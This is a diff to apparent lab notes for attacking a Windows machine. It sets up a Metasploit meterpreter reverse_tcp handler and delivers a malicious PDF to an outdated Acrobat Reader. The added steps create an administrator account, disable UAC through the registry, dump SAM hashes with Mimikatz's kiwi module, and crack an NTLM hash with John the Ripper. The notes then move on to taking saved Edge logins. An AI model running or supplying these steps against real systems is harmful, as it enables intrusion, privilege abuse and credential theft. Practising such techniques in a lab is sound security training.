@@ -22,8 +22,15 @@ sudo msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/r
 
 In windows 
 Prepare for this work:
+Create admin account via admin cmd:
+net user admin1 aaa /add
+net localgroup Administrators admin1 /add
+
+Then apply
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 shutdown /r /t 0
+
+After restart login using admin1 account
 
 After restart, in firewall exclude exe and pdf
 open the local email sever download the pdf, open it in the outdated acrobat reader, then open it it will ask to save the payload `form` save it int e document file (this is the default of the payload or need to change it)
@@ -40,6 +47,14 @@ getuid
 
 load kiwi
 lsa_dump_sam
+
+Look for something like
+User : admin1
+Hash NTLM: e24106942bf38bcf57a6a4b29016eff6
+
+In new terminal do:
+echo 'e24106942bf38bcf57a6a4b29016eff6' > ntlm.txt
+john --format=NT --incremental=Lower ntlm.txt
 
 
 Get the Edge saved login credentials>>
